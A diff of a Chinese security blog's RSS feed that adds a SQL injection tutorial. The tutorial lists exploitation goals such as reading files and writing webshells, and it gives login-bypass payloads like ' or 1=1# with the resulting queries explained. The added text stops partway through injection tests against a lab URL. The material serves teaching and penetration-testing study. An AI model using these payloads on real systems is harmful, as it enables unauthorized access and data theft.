+<li><strong>压倒性的体积：</strong>  未经过滤的大量数据可能会让用户不知所措。实施高效的索引和元数据标记可以缓解这种情况。</li>
+<li><strong>用户访问复杂性：</strong>  新用户可能难以查询非结构化数据。为了克服这个问题，请投资用户友好的查询解决方案，例如 <a href="https://prestodb.io/" target="_blank" rel="noopener noreferrer">Presto</a> 或 <a href="https://www.integrate.io/blog/12-sql-on-hadoop-tools/" target="_blank" rel="noopener noreferrer">SQL-on-Hadoop 工具</a>。</li>
+</ul>
+<h2>数据湖的未来趋势</h2>
+<p>随着数据生态系统的发展，数据湖变得更加智能和统一。新兴趋势包括：</p>
+<ul>
+<li>用于自动标记和发现的 AI 驱动的数据编目</li>
+<li>将分析性能与灵活性融为一体的数据湖屋的兴起</li>
+<li>与实时流媒体平台更紧密地集成。</li>
+</ul>
+<p>组织也正在转向受监管的自助服务模式，允许更多团队在不大量 IT 参与的情况下访问和分析数据，同时保持控制和合规性。</p>
+<h2>利用数据湖的力量</h2>
+<p>精心设计的数据湖不仅仅是高级存储解决方案，还提供了统一组织数据的机会。</p>
+<p>要从不同和孤立的数据中引入新的业务洞察，请考虑立即为您的企业构建数据湖。</p>
+]]></content:encoded>
     </item>
     <item>
       <title>《悉达多》读书笔记</title>
@@ -5986,13 +5986,6 @@ SIEM是一种整体性的安全方法。它将​安全信息管理（SIM） ​
 <p>如果您要存储用户密码或分发文件，请将保护它们作为您的首要任务。切换到 SHA-256 或 BLAKE2 等安全哈希函数，并在必要时实现加盐。</p>
 ]]></content:encoded>
       <enclosure url="https://raw.githubusercontent.com/youze27/blog/main/images/hashing-cryptography1-20251116171127-yvvh8xm.png" type="image/png"/>
-    </item>
-    <item>
-      <title>专业备考⏳</title>
-      <link>https://min168.top/com/exam/</link>
-      <guid>https://min168.top/com/exam/</guid>
-      <source url="https://min168.top/rss.xml">专业备考⏳</source>
-      <pubDate>Sun, 10 Aug 2025 14:49:59 GMT</pubDate>
     </item>
     <item>
       <title>应急响应核心术语与流程解析</title>
@@ -13779,6 +13772,570 @@ SQL Server的心脏和灵魂。</p>
 <h3>固定服务器角色</h3>
 <p>|固定服务器角色|说明|<br>
 |</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>MySQL注入漏洞深度复盘与实战</title>
+      <link>https://min168.top/perm/MySQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%E4%B8%8E%E5%AE%9E%E6%88%98.html</link>
+      <guid>https://min168.top/perm/MySQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%A4%8D%E7%9B%98%E4%B8%8E%E5%AE%9E%E6%88%98.html</guid>
+      <source url="https://min168.top/rss.xml">MySQL注入漏洞深度复盘与实战</source>
+      <description>注入原理 前端输入用户数据未被检测或过滤就直接带入数据库执行，造成SQL漏洞。 SQL注入条件 用户能控制输入的内容 用户输入的数据未被检测或过滤就带入数据库执行。 漏洞利用 获取数据库数据 读文件 load_file 获取系统shell，执行命令。 写webshell，控制网站。 查询用户的密码，连接到mysql数据库中。 注入分类 请求分类：GET...</description>
+      <category>渗透测试</category>
+      <pubDate>Mon, 02 Sep 2024 00:00:00 GMT</pubDate>
+      <content:encoded><![CDATA[<h2>注入原理</h2>
+<p>前端输入用户数据未被检测或过滤就直接带入数据库执行，造成SQL漏洞。</p>
+<h2>SQL注入条件</h2>
+<ol>
+<li>用户能控制输入的内容</li>
+<li>用户输入的数据未被检测或过滤就带入数据库执行。</li>
+</ol>
+<h2>漏洞利用</h2>
+<ol>
+<li>获取数据库数据</li>
+<li>读文件 load_file</li>
+<li>获取系统shell，执行命令。</li>
+<li>写webshell，控制网站。</li>
+<li>查询用户的密码，连接到mysql数据库中。</li>
+</ol>
+<h2>注入分类</h2>
+<ol>
+<li>
+<p>请求分类：GET、POST</p>
+</li>
+<li>
+<p>注入点参数分类：整型注入、字符型注入、搜素型注入</p>
+</li>
+<li>
+<p>反馈类型分类（重点）：</p>
+<p>1.union类型——联合查询</p>
+<p>2.错误类型显示——报错注入</p>
+<p>3.布尔类型——布尔盲注</p>
+<p>4.其他类型——宽字节注入、header注入、base64、url注入、堆叠注入</p>
+</li>
+<li>
+<p>根据数据库类型</p>
+<p>MySql、SQLserver、Oracle、Access</p>
+</li>
+</ol>
+<h2>注入方法</h2>
+<ol>
+<li>代码审计，阅读代码发现漏洞。</li>
+<li>万能密码构造。</li>
+<li>编写漏洞利用工具。</li>
+</ol>
+<h2>万能密码</h2>
+<p><span data-type="text" style="background-color: var(--b3-font-background9);">or 只要有一个真值就为真</span></p>
+<p><span data-type="text" style="background-color: var(--b3-font-background9);">and 只有当所有操作数都为真时，整个表达式才为真</span></p>
+<p><code>and</code>​ <span data-type="text" style="background-color: var(--b3-font-background9);"> 操作符的优先级高于 </span> <code>or</code>​ <span data-type="text" style="background-color: var(--b3-font-background9);"> 操作符</span></p>
+<ol>
+<li>
+<p>无限制</p>
+<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">user</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' or 1=1# pass = 1</span></span>
+<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'a'='a'</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><p>原理：比如内部有如下查询语句：</p>
+<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">''</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>当我们输入  <code>' or 1=1#</code>  之后，查询语句变为：</p>
+<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#' and password='pass'</span></span>
+<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    //因为有注释符所有是这样  or 1=1会使SQL语句恒成立（ture），从而查询出数据库中的所有账号和密码，从而使我们成功登录</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>用户名不能输入#</p>
+<p><code>user = ' or 1=1 or ''='  pass= 1</code></p>
+<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">''</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'1'</span></span>
+<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">                                  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">     and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">   ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>用户名不能输入不存在的用户名的字符串</p>
+<p>user =  <code>admin</code>    pass= <code>' or 1=1#</code></p>
+<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' admin '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># '</span></span>
+<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">                                      1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">     and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">         0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">    or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">   0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>密码位置不能输入#</p>
+<p><code>user = admin pass = ' or 1=1 or '' = '</code></p>
+<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' admin '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'   '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ''</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ' '</span></span>
+<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">                                    1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">       and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">        0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">       or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
+<li>
+<p>不能输入or #</p>
+<p><code>user = admin pass = ' or 1=1 or ''='</code></p>
+<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF">select</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> *</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> from</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> user</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> where</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> username</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' admin '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> and</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF"> password</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ''</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">' '</span></span>
+<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66">                                  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">         and</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">          0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">   or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  0</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> or</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">  ==&gt;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  1</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div></li>
+</ol>
+<figure><figcaption>image</figcaption></figure>
+<h2>手工注入</h2>
+<p>手工注入(英文名：Manual Injection),SQL注入有很多自动化工具，但是因为自动化工具不足以应对复杂情况，所以需要手动注入。</p>
+<h4>手工注入和自动化注入区别?</h4>
+<p>自动化注入是通过使用已经编写好的脚本或者工具进行$QL注入操作，因针对简单环境工具或脚本已经足够注入使用，在注入过程中可以通过工具上的功能模块较方边的进行SQL注入操作。</p>
+<h3>在什么情况下会使用手工注入?</h3>
+<ol>
+<li>在Web较复杂；</li>
+<li>自动化工具和脚本无法成功的进行SQL注入。</li>
+</ol>
+<h3>手工注入流程</h3>
+<p>mysql注释方法</p>
+<ol>
+<li><code>-- 注释内容;</code>  -- 后面是有一个空格的。-- 后面的内容将不会被识别，因此需要在下一行加上分号来结束该语句;</li>
+<li><code>#注释内容</code>   不能实现多行注释</li>
+<li><code>/*注释内容 */</code>   这种注释能够实现多行注释。</li>
+</ol>
+<h2>联合查询</h2>
+<ul>
+<li>
+<p>联合查询顾名思义及使用拼接联合方式将2组或多组关键值拼凑起来进行查询</p>
+</li>
+<li>
+<div class="language-java line-numbers-mode" data-highlighter="shiki" data-ext="java" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-java"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">select 字段名1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">字段名2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">...</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">字段名n from 表名1 union select 字段名1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">字段名2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">...</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">字段名n from 表名2</span></span></code></pre>
+<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div></li>
+<li>
+<p>每个 SELECT 语句必须拥有<span data-type="text" style="background-color: var(--b3-font-background8);">相同数量的列</span></p>
+</li>
+<li>
+<p>每个 SELECT 语句中的列的<span data-type="text" style="background-color: var(--b3-font-background9);">顺序必须相同</span></p>
+</li>
+<li>
+<p>union查询只可用于select语句。</p>
+</li>
+<li>
+<p>数据库查询的内容会被直接输出到页面中。</p>
+</li>
+<li>
+<p>union关键字默认去重，如果使用union all可以包含重复项。</p>
+</li>
+</ul>
+<ol>
+<li>
+<p>判断是否存在注入漏洞，识别注入点类型</p>
+<div class="language-sql line-numbers-mode" data-highlighter="shiki" data-ext="sql" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-sql"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">46649</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">1and1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">23</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">46649</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">1and1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">%</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">23</span></span>
+<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">//非数字型</span></span>
+<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">://</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">14</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">28</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">17</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">46649</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">string</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">?id</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'and1=1%23</span></span>
